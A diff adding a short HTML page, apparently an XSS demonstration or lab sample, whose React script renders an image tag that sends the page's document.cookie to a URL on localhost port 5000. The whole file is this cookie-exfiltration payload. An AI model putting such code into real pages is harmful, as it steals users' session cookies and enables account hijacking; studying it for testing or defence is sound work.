@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+</head>
+
+<body>
+    <div id="xss"></div>
+</body>
+
+<script type="text/babel">
+
+const compsButton = React.createElement(() => {
+    return <img src={'https://localhost:5000/img?c='+document.cookie} />
+})
+
+ReactDOM.render(compsButton, document.getElementById("xss"))
+</script>
+
+</html>
